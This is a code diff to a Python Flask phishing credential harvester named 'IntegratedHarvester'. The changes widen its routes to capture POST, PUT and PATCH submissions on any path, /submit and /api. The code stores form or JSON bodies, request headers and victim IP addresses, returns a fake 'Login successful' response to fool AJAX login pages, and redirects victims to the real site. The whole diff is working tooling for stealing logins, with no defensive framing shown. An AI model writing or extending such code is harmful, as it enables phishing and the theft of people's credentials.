@@ -49,9 +49,19 @@ class IntegratedHarvester:
         def serve_static(path):
             return self._serve_file(path)
         
-        @self.app.route('/<path:path>', methods=['POST'])
+        @self.app.route('/<path:path>', methods=['POST', 'PUT', 'PATCH'])
         def capture(path):
             return self._capture_credentials(path)
+        
+        @self.app.route('/submit', methods=['POST', 'PUT', 'PATCH'])
+        def capture_submit():
+            return self._capture_credentials('submit')
+        
+        @self.app.route('/api/<path:path>', methods=['POST', 'PUT', 'PATCH', 'GET'])
+        def capture_api(path):
+            if request.method in ['POST', 'PUT', 'PATCH']:
+                return self._capture_credentials(f'api/{path}')
+            return json.dumps({"success": True}), 200, {'Content-Type': 'application/json'}
         
         @self.app.route('/captured', methods=['GET'])
         def show_captured():
@@ -141,12 +151,20 @@ class IntegratedHarvester:
     def _capture_credentials(self, path):
         """Capture POST data"""
         try:
+            # Get form data or JSON data
+            if request.is_json:
+                form_data = request.get_json()
+            else:
+                form_data = dict(request.form)
+            
             data = {
                 "timestamp": datetime.now().isoformat(),
                 "path": path,
-                "form_data": dict(request.form),
+                "form_data": form_data,
                 "headers": dict(request.headers),
-                "ip": request.remote_addr
+                "ip": request.remote_addr,
+                "method": request.method,
+                "content_type": request.content_type
             }
             
             self.captured.append(data)
@@ -156,7 +174,7 @@ class IntegratedHarvester:
                 json.dump(self.captured, f, indent=2)
             
             logger.info(f"🎯 CAPTURED from {request.remote_addr}")
-            logger.info(f"📊 Data: {data['form_data']}")
+            logger.info(f"📊 Data: {form_data}")
             
             # Print to console
             print(f"\n{'='*60}")
@@ -164,8 +182,14 @@ class IntegratedHarvester:
             print(f"{'='*60}")
             print(f"Time: {data['timestamp']}")
             print(f"IP: {data['ip']}")
-            print(f"Data: {json.dumps(data['form_data'], indent=2)}")
+            print(f"Path: {path}")
+            print(f"Method: {request.method}")
+            print(f"Data: {json.dumps(form_data, indent=2)}")
             print(f"{'='*60}\n")
+            
+            # Return JSON response for AJAX requests
+            if request.is_json or 'application/json' in request.headers.get('Accept', ''):
+                return json.dumps({"success": True, "message": "Login successful"}), 200, {'Content-Type': 'application/json'}
             
             # Redirect to real site if configured
             if self.redirect_url:
@@ -175,6 +199,8 @@ class IntegratedHarvester:
                 
         except Exception as e:
             logger.error(f"Capture failed: {e}")
+            if request.is_json:
+                return json.dumps({"success": False, "error": str(e)}), 500, {'Content-Type': 'application/json'}
             return "Error", 500
     
     def start(self, redirect_url: str = None, background: bool = True):
